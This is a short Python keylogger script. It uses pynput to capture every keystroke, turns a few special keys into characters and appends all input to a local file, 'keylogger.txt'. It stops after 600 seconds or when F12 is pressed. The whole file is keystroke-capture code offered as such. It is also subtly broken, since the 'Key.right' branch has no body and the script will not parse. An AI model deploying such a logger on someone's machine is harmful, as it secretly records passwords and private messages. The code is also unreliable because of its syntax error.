from threading import Timer
from pynput.keyboard import Listener
import sys
    
def on_press(key):

    button = str(key)
    button = str(key).replace("'", "")

    # Special keys

    if button == "Key.space":
        button = ' '
    elif button == "Key.shift":                                   
        button = ''
    elif button == "Key.ctrl_l":
        button = ""
    elif button == "Key.ctrl":
        button = ""
    elif button == "Key.enter":
        button = "\n"
    elif button == "Key.backspace":
        button = '-'
    elif button == "Key.right":
    elif button == "Key.f12":           # f12 kills the listener
        print ("f12 pressed")
        sys.exit(-1)
    
            

    with open("keylogger.txt", 'a') as f:
        f.write(button)

# Collecting events until stopped

with Listener(on_press=on_press) as listener:
    Timer(600, listener.stop).start()              # The listener stops automatically after 600 seconds
    listener.join()
    print("The listener stopped")
